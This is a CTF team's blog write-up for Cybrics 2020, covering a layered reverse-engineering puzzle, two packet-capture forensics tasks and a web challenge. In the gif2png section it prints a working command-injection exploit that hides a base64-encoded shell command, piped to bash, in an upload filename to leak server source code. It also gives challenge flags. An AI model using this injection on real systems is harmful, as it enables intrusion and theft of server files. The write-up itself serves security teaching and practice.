---
layout: post
title: Cybrics CTF Writeup
date: 2020-07-25 01:00 +0700
modified: 2020-07-25 15:35:00 +07:00
tag:
  - ctf
  - writeup
comments: true  
image: https://0x90skids.com/cybrics-ctf-writeup/xcorp-flag.png
author: 0x90skids  
summmary: 0x90skids writeups for the 2020 Cybrics CTF Competition  
description:  0x90skids writeups for the 2020 Cybrics CTF Competition
---
# Categories 

+  [Rev](#rev)
+  [Web](#web)
+  [Forensics](#forensics)
+  [Network](#network)


## Rev

### Polyglot

**Solved By:** not-matthias  
**Points:** 50  
**Flag:** cybrics{4abd3e74e9e5960a1b6b923d842ccdac13658b3f}

##### Challenge

Prove us that you are a real polyglot :)


#### Solution

When you download the attachment and extract it, you get a `.c` file. The content of it looks like this: 

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char flagged[] = { /* array content */ };

int main(){
    char *key = getenv("XKEY");

    if((!key) ||strncmp("mod3r0d!",key,8 )){
        puts(";[");
        return 1;
    }

    unsigned long long val = *(unsigned long long *)key;
    unsigned long long *ptr = (unsigned long long *)flagged;
    
    while (*ptr != 0) {
        *ptr = *ptr ^ val;
        ptr += 1;
    }

    puts(flagged);
}
```

This is relatively simpe. You can just replace the `getenv` call with `"mod3r0d!"` and compile it with `gcc code.c -o code`. When we run this executable, we get another program. I put it into another file called `code2.cpp` as it's now a C++ program. 

The program looks like this:

```cpp
#include <iostream>

template <unsigned int a, unsigned int b>
struct t1 {
	enum { value = b + t1<a-1, b>::value };
};

template <unsigned int b>
struct t1<0, b> {
	enum { value = 0 };
};

template <unsigned int a, unsigned int b>
struct t2 {
	enum { value = 1 + t2<a-1, b>::value };
};

template <unsigned int b>
struct t2<0, b> {
	enum { value = 1 + t2<0, b-1>::value };
};

template<>
struct t2<0, 0>{
    enum { value = 0};
};

void decode(unsigned char *data, unsigned int val){
    unsigned int *ptr = reinterpret_cast<unsigned int *>(data);
    while (*ptr != 0) {
        *ptr = *ptr ^ val;
        val = (val ^ (val << 1)) ^ 0xc2154216;
        ptr += 1;
    }
}

unsigned char flagged[] = { /*array content */ };
int main(){
    decode(flagged, t2<0xcaca0000, t2<444, t1<t2<100, t1<4,3>::value>::value, t2<44, t1<11,3>::value>::value>::value>::value>::value);
    std::cout << flagged <<std::endl;
}
```

When I first looked at it, I didn't know what do to with it, so I just tried to compile it with `g++ code2.cpp -o code2`. When I ran this command it didn't work: 

```bash
[not-matthias@computer polyglot]$ g++ code2.cpp -o code2
code2.cpp: In instantiation of ‘struct t2<0, 8169>’:
code2.cpp:16:33:   recursively required from ‘struct t2<0, 8623>’
code2.cpp:12:33:   recursively required from ‘struct t2<443, 8624>’
code2.cpp:12:33:   required from ‘struct t2<444, 8624>’
code2.cpp:32:118:   required from here
code2.cpp:16:33: fatal error: template instantiation depth exceeds maximum of 900 (use ‘-ftemplate-depth=’ to increase the maximum)
   16 |  enum { value = 1 + t2<0, b-1>::value };
      |                                 ^~~~~
compilation terminated.
```

It seems there's a recursion going on which exceeds some kind of limit. I then tried to adjust this template depth and the maximum stack size, but that didn't work either. I then had to actually understand what the code is doing. 

I edited the code and ran it with custom examples and it seemed like those templates are just like normal functions. You pass parameters and you get a return value using `::value`. I then translated those templates to functions hoping it would help somehow: 

```cpp
int t1(unsigned int a, unsigned int b) {
    if (a == 0) {
        return 0;
    }

    return b + t1(a-1, b);
}

int t2 (unsigned int a, unsigned int b) {
    if (a == 0 && b == 0) {
        return 0;
    }

    if (a == 0) {
        return 1 + t2(0, b-1);
    }


    return 1 + t2(a-1, b);
}
```

Now we can compile the binary but whenever we run it, it will crash. I finally understood what was causing the problem. Those templates seems to calculate the value at **compile-time**. So when we call those functions with too big numbers we basically overflow the stack. 

I tried to calculate as many values as possible and replace the function calls in the binary. This way I could remove `t1` entirely and focus on `t2` because the last call would always overflow the stack. I remembered that I can remove the recursion and write an iterative version. I then copied the previous code and pasted it into the [Rust Playground](https://play.rust-lang.org) where I started experimenting. I called the function with all kinds of values to see how it behaves. In the end, I figured that it just adds the passed parameters and returns the result. 

```rust
fn t2_recursive(a: u32, b: u32) -> u32 {
    if a == 0 && b == 0 {
        return 0;
    }

    if a == 0 {
        return 1 + t2_recursive(0, b-1);
    }

    return 1 + t2_recursive(a-1, b);
}

fn t2_iterative(a: u32, b: u32) -> u32 {
    let mut temp = 0;
    
    if a == 0 && b == 0 {
        return 0
    }

    temp += b;
    temp += a;
    
    temp
}

fn main() {
    println!("{}", t2_recursive(444, 8624));
    println!("{}", t2_iterative(444, 8624));
    // println!("{}", t2_recursive(0xcaca0000, 9068));
    println!("{}", t2_iterative(0xcaca0000, 9068));
}
```

When you run it, you get the following output: 

```
9068
9068
3402244972
```

Now we can just replace the function calls in the binary, run it and see what happens. Alright, it seems there's another layer: 

```python
import types

def define_func(argcount, nlocals, code, consts, names):
    #PYTHON3.8!!!
    def inner():
        return 0

    fn_code = inner.__code__
    cd_new = types.CodeType(argcount,
                             0,
                             fn_code.co_kwonlyargcount,
                             nlocals,
                             1024,
                             fn_code.co_flags,
                             code,
                             consts,
                             names,
                             tuple(["v%d" for i in range(nlocals)]),
                             fn_code.co_filename,
                             fn_code.co_name,
                             fn_code.co_firstlineno,
                             fn_code.co_lnotab,
                             fn_code.co_freevars,
                             fn_code.co_cellvars)
    inner.__code__ = cd_new
    return inner

f1 = define_func(2,2,b'|\x00|\x01k\x02S\x00', (None,), ())
f2 = define_func(1,1,b't\x00|\x00\x83\x01S\x00', (None,), ('ord',))
f3 = define_func(0,0,b't\x00d\x01\x83\x01S\x00', (None,  'Give me flag: '), ('input',))
f4 = define_func(1, 3, b'd\x01d\x02d\x03d\x04d\x05d\x01d\x06d\x07d\x08d\td\x03d\nd\x0bd\x0cd\rd\x08d\x0cd\x0ed\x0cd\x0fd\x0ed\x10d\x11d\td\x12d\x03d\x10d\x03d\x0ed\x13d\x0bd\nd\x14d\x08d\x13d\x01d\x01d\nd\td\x01d\x12d\x0bd\x10d\x0fd\x14d\x03d\x0bd\x15d\x16g1}\x01t\x00|\x00\x83\x01t\x00|\x01\x83\x01k\x03r\x82t\x01d\x17\x83\x01\x01\x00d\x18S\x00t\x02|\x00|\x01\x83\x02D\x00]$}\x02t\x03|\x02d\x19\x19\x00t\x04|\x02d\x1a\x19\x00\x83\x01\x83\x02d\x18k\x02r\x8c\x01\x00d\x18S\x00q\x8cd\x1bS\x00',
                 (None, 99, 121, 98, 114, 105, 115, 123, 52, 97, 100, 51, 101, 55, 57, 53, 54, 48, 49, 50, 56, 102, 125, 'Length mismatch!', False, 1, 0, True),
                 ('len', 'print', 'zip', 'f1', 'f2'))
f5 = define_func(0, 1,b't\x00\x83\x00}\x00t\x01|\x00\x83\x01d\x01k\x08r\x1ct\x02d\x02\x83\x01\x01\x00n\x08t\x02d\x03\x83\x01\x01\x00d\x00S\x00',(None, False, 'Nope!', 'Yep!'), ('f3', 'f4', 'print'))
f5()

```

Looking at the strings, we can already assume that this will be the last layer. When you run it, you will be asked to enter the flag which we don't know ... yet. I then tried to look at the python bytecode and see what each of those functions do: 

- `f1`: Checks if the two passed parameters are equal. 
  - `print(f1(1, 1))`
- `f2`: A simple wrapper for the `ord` function that returns the number that represents the passed character.
  - `print(f2('a'))`
- `f3`: Wrapper around the `input` function that asks the user for the flag. 
- `f4`: Seems to be the check whether the input is valid. 
- `f5`: The actual function that will call the other functions. It's the entry point. 


After I figured that reversing the bytecode is not going anywhere, I tried to convert the contants passed to `f4` to a string. 

```python
flag = [99, 121, 98, 114, 105, 115, 123, 52, 97, 100, 51, 101, 55, 57, 53, 54, 48, 49, 50, 56, 102, 125]

print(''.join([chr(c) for c in flag]))
```

This will output `cybris{4ad3e79560128f}` which does not match the flag format of `cybrics{...}`, so we are missing some characters. I then had an idea: We can obviously see that the function names are passed to `define_func` function so can we use this to hook those functions? Let's try it out. 

```python
def custom_len(d):
    print("custom_len: ", d)

    return len(d)
```

I replaced `len` with `custom_len` for `f4` and ran it again: 

```
[not-matthias@computer polyglot]$ python code3.py 
Give me flag: 0x90skids
custom_len:  0x90skids
custom_len:  [99, 121, 98, 114, 105, 99, 115, 123, 52, 97, 98, 100, 51, 101, 55, 52, 101, 57, 101, 53, 57, 54, 48, 97, 49, 98, 54, 98, 57, 50, 51, 100, 56, 52, 50, 99, 99, 100, 97, 99, 49, 51, 54, 53, 56, 98, 51, 102, 125]
Length mismatch!
Nope!
```

As you can see, it also checks the length of another array which coincidentally starts with the same values as our wrong flag. Let's try to convert it to a string: 

```python
flag = [99, 121, 98, 114, 105, 99, 115, 123, 52, 97, 98, 100, 51, 101, 55, 52, 101, 57, 101, 53, 57, 54, 48, 97, 49, 98, 54, 98, 57, 50, 51, 100, 56, 52, 50, 99, 99, 100, 97, 99, 49, 51, 54, 53, 56, 98, 51, 102, 125]

print(''.join([chr(c) for c in flag]))
```

Awesome! It prints the correct flag: `cybrics{4abd3e74e9e5960a1b6b923d842ccdac13658b3f}`. 

## Web

### gif2png

**Solved By:** cernec1999  
**Points:** 52  
**Flag:** cybrics{imagesaresocoolicandrawonthem}

##### Challenge

This challenge features an eccentric GIF to PNG converter web application. The challenge ships with a directory of the source code. The server is a Python3 Werkzeug application with a flag variable stored in the source code. We have to figure out how to leak the source code file on the server-side to get the flag.

##### Solution

Right away, we can see there is a command line injection vulnerability at ```main.py:73```. The line looks like this:

```python
command = subprocess.Popen(f"ffmpeg -i 'uploads/{file.filename}' \"uploads/{uid}/%03d.png\"", shell=True)
```

The file.filename variable (which is sent via the client upon file upload) can be controlled by an attacker. An attacker can set this filename to be arbitrary values. However, there are a few constraints that the filename must have in order to be "valid".

1. The filename must have the extension .gif
2. The content type must be image/gif
3. The filename must pass a regex constraint

The first two constraints are easy to bypass as the attacker can arbitrarily set the filename and content type from the client. The third constraint is a tad harder, but using our trusty regex knowledge, we can form the payload.

The condition we need to pass looks like this.

```python
if not bool(re.match("^[a-zA-Z0-9_\-. '\"\=\$\(\)\|]*$", file.filename)) or ".." in file.filename:
```

Luckily, our payload can contain any alphanumeric characters and a few symbols which will make our life much easier. In our case, besides alphanumeric characters, we only need these three characters: ```'```, ```-```, and ```|```.

Using the unix pipe operator, we can run multiple commands. Normally, the pipe operator routes the standard out from a specific process to another process, but in our case, we will use it for our command injection.

Initially, I tried to make my payload send the main.py file to a remote server via curl (and Python3), but I could not get it to work. Perhaps they set up strange firewall rules. I then took the obvious route of simply moving the ```main.py``` file to the ```uploads/``` directory on the webserver.

Here is my completed solution. It even features encoding the payload into base64 so you can use many other symbols!

```python
#!/usr/bin/python3
import requests, base64

# Shellcode to execute
shellcode = "mkdir uploads/haxxxx && cp main.py uploads/haxxxx/main.py"

# b64 encoded shellcode
encoded = base64.b64encode(shellcode.encode("utf-8")).decode("utf-8")

# Exploit string
exp = f"\' | echo \'{encoded}\' | base64 -d  |  bash  | \'.gif"

# Upload file
files = {'file':(exp, open('FullColourGIF.gif', 'rb'), 'image/gif')}
r = requests.post("http://gif2png-cybrics2020.ctf.su/", files=files)
```

Then, we simply need to access http://gif2png-cybrics2020.ctf.su/uploads/haxxxx/main.py to get our flag.

## Forensics

### Krevedka

**Solved By:** cernec1999  
**Points:** 50  
**Flag:** cybrics{micropetalous}

##### Challenge

This challenge involves a large ```.pcapng``` file. Our task is to search through the HTTP requests and figure out which user "hacked" into another user's account.

The task says the victim user is ```caleches```.

##### Solution

1. First, we open the pcap file.
2. Then, we can do a simple binary search within to find the user ```caleches```.
3. We investigate the TCP stream of the hacked account to learn the attacker's user agent.
```
User-Agent: UCWEB/2.0 (Linux; U; Opera Mini/7.1.32052/30.3697; www1.smart.com.ph/; GT-S5360) U2/1.0.0 UCBrowser/9.8.0.534 Mobile
```
4. We search for that user agent in the packets.
5. We investigate the TCP stream of this user agent, and we find out that it's for the login of user ```micropetalous```.  


## Network  

### Xcorp  

**Solved By:** [tbutler0x90](https://tbutler.org)   
**Points:** 50  
**Flag:** cybrics{53CuR1tY_N07_0b5CuR17Y}

##### Challenge  

This challenge features a ```.pcap``` file which the author describes as being captured on the ficticious "xcorp" network. It incudes the description that employees on the xcorp network are using "in-house software" to keep their secrets.    

##### Solution  

1) First, we opened the pcap file with packet capture analyzer, Wireshark.   
2) Looking at the network traffic, we notice that the nc10.exe application is requested via the SMB protocol.      

![](2020-07-025-cybrics-ctf/xcorp-nc10.png)    

3) Using the file --> export objects option in wireshark, the nc10.exe and other files requested are exported.      

![](2020-07-025-cybrics-ctf/xcorp-export.png)    

1) The executable was a Microsoft Windows application. In order to run, it was executed in a windows VM.  The application asks for a username which was also found during the pcap analysis.    

![](2020-07-025-cybrics-ctf/xcorp-login.png)  

5) Running the application with the username "u17ra_h4ck3r" gave us the flag.

![](2020-07-025-cybrics-ctf/xcorp-flag.png)  





